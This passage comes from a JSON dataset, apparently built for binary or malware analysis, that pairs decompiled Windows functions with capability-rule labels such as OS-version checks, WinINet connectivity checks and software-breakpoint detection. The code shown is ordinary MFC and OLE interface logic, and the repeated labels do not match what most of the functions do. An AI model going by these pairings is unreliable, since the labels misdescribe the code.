        "decompiled_code": "\nvoid __cdecl fcn.00449439(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_10h;\n    uint32_t var_ch;\n    \n    fcn.0044930c(&var_30h, arg_8h, arg_14h);\n    if (arg_10h != 0) {\n        uVar1 = fcn.0045f3a0(&var_20h, 0x10, arg_10h, 0x10);\n        fcn.00401000(uVar1);\n    }\n    iVar2 = fcn.0043026e();\n    var_10h = *(iVar2 + 0xc);\n    var_ch = arg_ch & 0xffff;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x404, 0, &var_30h);\n    return;\n}\n",
        "token_count": 248
    },
    "00449548": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00449548(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_ch;\n    \n    iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x20));\n    if (iVar1 != 0) goto code_r0x00449564;\n    do {\n        do {\n            fcn.00411e42();\ncode_r0x00449564:\n        } while (arg_ch == 0);\n        uVar2 = fcn.00462ab0(arg_8h);\n    } while (0x400 < uVar2);\n    fcn.0044930c(&var_30h, arg_ch, arg_10h);\n    var_ch = arg_8h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x40c, 0, &var_30h);\n    return;\n}\n",
        "token_count": 241
    },
    "00449a95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00449a95(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    \n    iVar1 = fcn.004302e1();\n    iVar2 = *(iVar1 + 0x3c);\n    if (arg_8h == 0) {\n        if ((*(in_ECX + 0x3c) & arg_ch) != 0) {\n            if (*(iVar1 + 0x40) == in_ECX) {\n                fcn.00416f98(1);\n            }\n            if ((iVar2 != 0) && (*(iVar2 + 0x20) != 0)) {\n                fcn.00462290(&var_30h, 0, 0x30);\n                var_28h = *(in_ECX + 0x20);\n                var_30h = 0x28;\n                var_2ch = 1;\n                var_24h = var_28h;\n                (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x20), 0x405, 0, &var_30h);\n            }\n            *(in_ECX + 0x3c) = *(in_ECX + 0x3c) & ~arg_ch;\n        }\n    }\n    else if ((*(in_ECX + 0x3c) & arg_ch) == 0) {\n        iVar2 = fcn.0043026e();\n        *(iVar2 + 0x38) = 0x4499c5;\n        *(in_ECX + 0x3c) = *(in_ECX + 0x3c) | arg_ch;\n    }\n    return 1;\n}\n",
        "token_count": 421
    },
    "00449bb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00449bb8(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    uVar1 = 0;\n    uVar2 = *(param_1 + 0x78) & 0xa000;\n    if (*(param_1 + 0x7c) != 0) {\n        uVar2 = uVar2 == 0;\n    }\n    if ((uVar2 == 0) || ((*(param_1 + 0x70) & 0xa000) == 0)) {\n        if ((*(param_1 + 0x70) & 0x5000) == 0) goto code_r0x00449c16;\n        uVar1 = *(param_1 + 0x70) & 0xffff5fff;\n        puVar3 = param_1 + 0x38;\n    }\n    else {\n        uVar1 = *(param_1 + 0x70) & 0xffffafff;\n        puVar3 = param_1 + 0x28;\n    }\n    uVar1 = fcn.00453a15(*puVar3, puVar3[1], puVar3[2], puVar3[3], uVar1, 0);\ncode_r0x00449c16:\n    if ((*(param_1 + 0x7c) == 0) && (uVar1 == 0)) {\n        if ((*(param_1 + 0x70) & 0xa000) != 0) {\n            fcn.00453a15(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), \n                         *(param_1 + 0x70) & 0xffffafff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffffafff;\n            uVar1 = fcn.00453a15(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        }\n        if ((*(param_1 + 0x70) & 0x5000) != 0) {\n            fcn.00453a15(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), \n                         *(param_1 + 0x70) & 0xffff5fff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffff5fff;\n            uVar1 = fcn.00453a15(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 758
    },
    "00449f99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00449f99(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t arg_24h;\n    int32_t in_ECX;\n    uint *puVar3;\n    uint lprc;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 1;\n    var_10h = 1;\n    uVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0);\n    var_8h = fcn.0042e42a(uVar2);\n    var_ch = var_8h;\n    var_4h = fcn.00438d21();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if ((*(in_ECX + 0x74) & 0xa000) == 0) {\n        if ((*(in_ECX + 0x74) & 0x5000) == 0) {\n            var_14h = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x20);\n            var_14h = var_14h + -1;\n            var_10h = (*pcVar1)(0x21);\n            var_10h = var_10h + -1;\n            if ((((*(in_ECX + 0x78) & 0xa000) == 0) || (*(in_ECX + 0x7c) != 0)) &&\n               (((*(in_ECX + 0x78) & 0x5000) == 0 || (*(in_ECX + 0x7c) == 0)))) {\n                puVar3 = in_ECX + 0x58;\n            }\n            else {\n                puVar3 = in_ECX + 0x48;\n            }\n            var_8h = var_4h;\n        }\n        else {\n            puVar3 = in_ECX + 0x38;\n        }\n    }\n    else {\n        puVar3 = in_ECX + 0x28;\n    }\n    lprc = *puVar3;\n    uStack36 = puVar3[1];\n    uStack32 = puVar3[2];\n    uStack28 = puVar3[3];\n    if (arg_8h != 0) {\n        var_10h = 0;\n        var_14h = 0;\n    }\n    if ((*(in_ECX + 0x74) & 0xf000) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(&lprc, 0xffffffff, 0xffffffff);\n    }\n    arg_24h = var_4h;\n    if (*(in_ECX + 0x24) == 0) {\n        arg_24h = var_ch;\n    }\n    fcn.00438dc4(&lprc, var_14h, var_10h, in_ECX + 0xc, *(in_ECX + 0x1c), *(in_ECX + 0x20), var_8h, arg_24h);\n    *(in_ECX + 0xc) = lprc;\n    *(in_ECX + 0x1c) = var_14h;\n    *(in_ECX + 0x10) = uStack36;\n    *(in_ECX + 0x20) = var_10h;\n    *(in_ECX + 0x14) = uStack32;\n    *(in_ECX + 0x18) = uStack28;\n    *(in_ECX + 0x24) = var_8h == var_4h;\n    return;\n}\n",
        "token_count": 849
    },
    "0044a0a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044a0a4(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (*param_2 != param_3) {\n        *param_2 = param_3;\n        if ((((*(param_1 + 0x70) & 0xa000) == 0) || ((*(param_1 + 0x70) & 0x5000) == 0)) || (*(param_1 + 0x7c) == 0)) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n        *(param_1 + 0x7c) = uVar1;\n        if (*(param_1 + 0x80) == 0) {\n            uVar1 = fcn.00449bb8();\n        }\n        else {\n            uVar1 = 0;\n        }\n        *(param_1 + 0x74) = uVar1;\n        fcn.00449f99(0);\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "0044a0f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a0f8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_OffsetRect;\n    iVar4 = arg_8h - *(in_ECX + 4);\n    iVar2 = arg_ch - *(in_ECX + 8);\n    (*_sym.imp.USER32.dll_OffsetRect)(in_ECX + 0x28, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x48, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x38, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x58, iVar4, iVar2);\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    if (*(in_ECX + 0x80) == 0) {\n        uVar3 = fcn.00449bb8();\n    }\n    else {\n        uVar3 = 0;\n    }\n    *(in_ECX + 0x74) = uVar3;\n    fcn.00449f99(0);\n    return;\n}\n",
        "token_count": 310
    },
    "0044a361": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a361(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint arg_10h;\n    uint *puVar2;\n    uint arg_ch;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t var_4h;\n    \n    fcn.0044a31c();\n    if (*(param_1 + 0x74) == 0) {\n        uVar1 = *(param_1 + 0x78);\n        if ((((uVar1 & 4) == 0) && (((uVar1 & 0xa000) == 0 || (*(param_1 + 0x7c) != 0)))) &&\n           (((uVar1 & 0x5000) == 0 || (*(param_1 + 0x7c) == 0)))) {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x1000;\n            *(param_1 + 0xa8) = *(param_1 + 0x58);\n            arg_10h = *(param_1 + 0x5c);\n            arg_ch = *(param_1 + 0x58);\n        }\n        else {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x2000;\n            *(param_1 + 0xa8) = *(param_1 + 0x48);\n            arg_10h = *(param_1 + 0x4c);\n            arg_ch = *(param_1 + 0x48);\n        }\n        *(param_1 + 0xac) = arg_10h;\n        *(param_1 + 0xa4) = uVar1;\n        fcn.004538e5(*(param_1 + 0x68), arg_ch, arg_10h, uVar1);\n    }\n    else {\n        var_4h = fcn.00449cd6(*(param_1 + 0x74));\n        puVar2 = param_1 + 0x38;\n        if ((*(param_1 + 0x74) & 0x5000) == 0) {\n            puVar2 = param_1 + 0x28;\n        }\n        var_14h = *puVar2;\n        uStack20 = puVar2[1];\n        uStack16 = puVar2[2];\n        uStack12 = puVar2[3];\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(var_4h + 0x20));\n        if ((uVar1 & 0xffff) - 0xe81b < 4) {\n            *(param_1 + 0x90) = uVar1 & 0xffff;\n            *(param_1 + 0x94) = var_14h;\n            *(param_1 + 0x98) = uStack20;\n            *(param_1 + 0x9c) = uStack16;\n            *(param_1 + 0xa0) = uStack12;\n            fcn.0042dd8a(param_1 + 0x94);\n        }\n        fcn.00453736(*(param_1 + 0x68), var_4h, &var_14h);\n        (**(**(param_1 + 0x6c) + 0x148))(1);\n    }\n    return;\n}\n",
        "token_count": 768
    },
    "0044b853": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044b853(uint noname_0, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0041be35();\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x20), &var_14h);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x21);\n    iVar4 = (*pcVar1)(0x20);\n    iVar5 = fcn.00418521();\n    if ((var_4h & 0x1000) != 0) {\n        if (iVar5 == 3) {\n            iVar5 = 2;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(2);\n        if (iVar2 < 0) {\n            return 0;\n        }\n    }\n    if (((9 < iVar5) && (iVar5 < 0x12)) || (iVar5 == 4)) {\n        if ((var_4h & 0x800) == 0) {\n            (*_sym.imp.USER32.dll_InflateRect)(&var_14h, -iVar4, -iVar3);\n            if ((var_4h & 0x200) != 0) {\n                if (iVar5 != 4) {\n                    if (iVar5 == 0xd) {\n                        return (arg_ch < var_10h) * 2 + 10;\n                    }\n                    if (iVar5 == 0xe) {\n                        return (arg_ch < var_10h) + 0xb;\n                    }\n                    if (iVar5 == 0x10) {\n                        return ((arg_ch <= var_8h) - 1 & 5) + 10;\n                    }\n                    if (iVar5 != 0x11) {\n                        return iVar5;\n                    }\n                }\n                iVar5 = (var_8h < arg_ch) * 4 + 0xb;\n            }\n        }\n        else {\n            iVar5 = 2;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 539
    },
    "0044c168": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044c168(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.0044bf7a(arg_10h + iVar1, 0xffffffff);\n            iVar3 = *(in_ECX + 4) + arg_8h;\n            fcn.00429a2a(iVar3 + arg_10h, (*(in_ECX + 8) - arg_8h) - arg_10h, iVar3, iVar1 - arg_8h);\n            fcn.00462290(*(in_ECX + 4) + arg_8h, 0, arg_10h);\n        }\n        else {\n            fcn.0044bf7a(arg_10h + arg_8h, 0xffffffff);\n        }\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 1;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00411e42();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 355
    },
    "0044c347": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044c347(int32_t pszPath, int32_t arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (pszPath == 0) {\n        fcn.00411e42();\n    }\n    uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)(pszPath);\n    if (arg_ch == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n        iVar2 = iVar2 + 1;\n    }\n    else {\n        fcn.00411e90(arg_ch, arg_10h, uVar1, 0xffffffff);\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 173
    },
    "0044c385": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c385(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint uVar5;\n    uchar *puStack848;\n    char *pcStack844;\n    uint uStack840;\n    uchar *puStack836;\n    uchar *puStack832;\n    uchar *pszPath;\n    char acStack784 [124];\n    uchar auStack660 [132];\n    uchar auStack528 [260];\n    char acStack268 [260];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ &stack0xfffffd6c;\n    iVar2 = fcn.0043026e();\n    *(iVar2 + 8) = *(param_1 + 0x44);\n    *(iVar2 + 0xc) = *(param_1 + 0x44);\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    if ((iVar3 == 0) || (iVar3 == 0x104)) {\n        fcn.0042d805();\n    }\n    puVar4 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionA)();\n    if (puVar4 == NULL) {\n        fcn.0042d805();\n    }\n    *puVar4 = 0;\n    pszPath = &stack0xfffffef4;\n    puStack832 = 0x44c40e;\n    iVar3 = fcn.0044c347(pszPath, &stack0xfffffdf0, 0x104);\n    if (iVar3 != 0) {\n        puStack832 = 0x44c417;\n        fcn.0042d805();\n    }\n    if (*(param_1 + 0x60) == 0) {\n        puStack832 = &stack0xfffffdf0;\n        puStack836 = 0x44c429;\n        iVar3 = fcn.00463f63();\n        *(param_1 + 0x60) = iVar3;\n        if (iVar3 == 0) goto code_r0x00411e0e;\n    }\n    iVar3 = *(param_1 + 0x50);\n    if (iVar3 == 0) {\n        puStack832 = 0x100;\n        puStack836 = &stack0xfffffcf0;\n        uStack840 = 0xe000;\n        pcStack844 = 0x44c450;\n        iVar3 = fcn.00423ed7();\n        if (iVar3 == 0) {\n            pcStack844 = *(param_1 + 0x60);\n        }\n        else {\n            pcStack844 = &stack0xfffffcf0;\n        }\n        puStack848 = 0x44c462;\n        iVar3 = fcn.00463f63();\n        *(param_1 + 0x50) = iVar3;\n        if (iVar3 == 0) goto code_r0x00411e0e;\n    }\n    *(iVar2 + 0x10) = iVar3;\n    if (*(param_1 + 100) == 0) {\n        puStack848 = &stack0xfffffff8 + -puVar4;\n        if (*(param_1 + 0x6c) == 1) {\n            pcStack844 = \".CHM\";\n        }\n        else {\n            pcStack844 = \".HLP\";\n        }\n        fcn.00424fd8(puVar4);\n        pcStack844 = &stack0xfffffef4;\n        puStack848 = 0x44c4a6;\n        iVar2 = fcn.00463f63();\n        *(param_1 + 100) = iVar2;\n        if (iVar2 == 0) goto code_r0x00411e0e;\n        *puVar4 = 0;\n    }\n    if (*(param_1 + 0x68) == 0) {\n        pcStack844 = \".INI\";\n        puStack848 = 0x104;\n        uVar5 = fcn.0046397b(&stack0xfffffdf0);\n        fcn.00401000(uVar5);\n        iVar2 = fcn.00463f63(&stack0xfffffdf0);\n        *(param_1 + 0x68) = iVar2;\n        if (iVar2 == 0) {\ncode_r0x00411e0e:\n            puStack848 = 0x4b6188;\n            pcStack844 = &stack0xfffffd6c;\n            fcn.0046230a(&stack0xfffffcb0, 0x4a75f0);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    puStack832 = 0x44c4fc;\n    fcn.0045e747(pszPath);\n    return;\n}\n",
        "token_count": 1069
    },
    "0044c504": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0044c504(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.0043026e();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    fcn.0042f6c9();\n    iVar3 = fcn.0043026e();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x48) = param_1;\n        *(iVar3 + 0x4c) = param_2;\n        *(iVar3 + 0x44) = unaff_ESI;\n        fcn.0044c385();\n    }\n    iVar3 = fcn.0043026e();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.00427084();\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"user32.dll\");\n    if (iVar3 != 0) {\n        *0x4bb074 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"NotifyWinEvent\");\n    }\n    return 1;\n}\n",
        "token_count": 348
    },
    "0044ccbb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ccbb(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint *arg_8h_00;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    var_1ch = NULL;\n    piVar1 = fcn.00431b02(in_ECX[9], 0x49fa88);\n    if (piVar1 == NULL) {\n        piVar1 = (**(*in_ECX + 0xc0))();\n        arg_8h_00 = &var_1ch;\n        iVar2 = (**(*piVar1 + 0x10))(piVar1, 4, 3);\n    }\n    else {\n        arg_8h_00 = &var_1ch;\n        iVar2 = (**(*piVar1 + 0x18))(piVar1);\n        (**(*piVar1 + 8))(piVar1);\n    }\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ole32.dll_CreateStreamOnHGlobal)(0, 1, &var_18h);\n        if (iVar2 != 0) {\n            (**(*var_1ch + 8))(var_1ch);\n            fcn.00411e0e();\n        }\n        piVar1 = (*_sym.imp.ole32.dll_OleSaveToStream)(var_1ch, var_18h);\n        (**(*var_1ch + 8))(var_1ch);\n        if (piVar1 == NULL) goto code_r0x0044cd70;\n        (**(*var_18h + 8))(var_18h);\n        while( true ) {\n            fcn.00413258(piVar1);\ncode_r0x0044cd70:\n            in_ECX = (**(*in_ECX[9] + 0x3c))(in_ECX[9], &var_14h);\n            if ((in_ECX == NULL) && (in_ECX = (*_sym.imp.ole32.dll_WriteClassStm)(var_18h, &var_14h),  in_ECX == NULL))\n            break;\n            (**(*var_18h + 8))(var_18h);\n            piVar1 = in_ECX;\n        }\n        arg_8h[2] = 0;\n        arg_8h[1] = var_18h;\n        *arg_8h = 4;\n    }\n    fcn.0045e747(arg_8h_00);\n    return;\n}\n",
        "token_count": 619
    },
    "0044ce9b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044ce9b(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x50) != 3) && (*(param_1 + 0x50) != 4)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 66
    },
    "0044ceb5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044ceb5(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (*(param_1 + 0x12) == '\\0') {\n        *(param_1 + 0x12) = 1;\n        iVar1 = (**(*param_1[9] + 0x18))(param_1[9], param_2);\n        param_1[0xd] = iVar1;\n        if (*(param_1 + 0x46) != '\\0') {\n            (*_sym.imp.ole32.dll_OleLockRunning)(param_1[9], 0, 1);\n            *(param_1 + 0x46) = 0;\n        }\n        if (param_1[0x14] != 1) {\n            if (param_1[0x14] == 4) {\n                (**(*param_1 + 0x80))(0);\n            }\n            if (param_1[0x14] == 3) {\n                (**(*param_1 + 0x98))();\n            }\n            if (param_1[0x14] != 1) {\n                (**(*param_1 + 0x6c))(4, 1);\n                param_1[0x14] = 1;\n            }\n        }\n        *(param_1 + 0x12) = 0;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "0044cf8b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044cf8b(char *param_1)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    uint *unaff_EBX;\n    \n    for (; (cVar1 = *in_EAX,  cVar1 != ',' && (cVar1 != '\\0')); in_EAX = fcn.00464bbe(in_EAX)) {\n        *param_1 = cVar1;\n        param_1 = fcn.00464bbe(param_1);\n    }\n    *param_1 = '\\0';\n    if (*in_EAX == '\\0') {\n        *unaff_EBX = 0;\n    }\n    else {\n        uVar2 = fcn.00464bbe(in_EAX);\n        uVar2 = fcn.004646c8(uVar2);\n        *unaff_EBX = uVar2;\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "0044d748": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d748(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    int32_t **ppiVar4;\n    int32_t **ppiStack72;\n    int32_t *var_8h;\n    int32_t *dwBytes;\n    \n    var_8h = in_ECX;\n    dwBytes = in_ECX;\n    fcn.004103b0(&dwBytes);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2002, dwBytes);\n    if (iVar1 == 0) {\n        fcn.00411e0e();\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n    piVar3 = fcn.00429a49(uVar2, dwBytes);\n    (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar1);\n    if (piVar3 != dwBytes) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(iVar1);\n        fcn.004299a5(3, 0);\n    }\n    ppiVar4 = in_ECX + 0xf;\n    arg_8h_00 = (*_sym.imp.ole32.dll_CreateILockBytesOnHGlobal)(iVar1, 1, ppiVar4);\n    if (arg_8h_00 == 0) goto code_r0x0044d7cb;\n    (*_sym.imp.KERNEL32.dll_GlobalFree)(iVar1);\n    while( true ) {\n        while( true ) {\n            fcn.00413258(arg_8h_00);\ncode_r0x0044d7cb:\n            ppiStack72 = NULL;\n            piVar3 = in_ECX + 0xe;\n            arg_8h_00 = (*_sym.imp.ole32.dll_StgOpenStorageOnILockBytes)(*ppiVar4, 0, 0x12, 0);\n            if (arg_8h_00 == 0) break;\n            (**(**ppiVar4 + 8))(*ppiVar4);\n            *ppiVar4 = NULL;\n        }\n        var_8h = NULL;\n        uVar2 = (**(*in_ECX + 0xc0))(&var_8h);\n        uVar2 = (*_sym.imp.ole32.dll_OleLoad)(in_ECX[0xe], 0x4a0a08, uVar2);\n        (**(*in_ECX + 200))(uVar2);\n        iVar1 = fcn.00431b02(var_8h, 0x49faa8);\n        in_ECX[9] = iVar1;\n        (**(*var_8h + 8))(var_8h);\n        if (in_ECX[9] != 0) 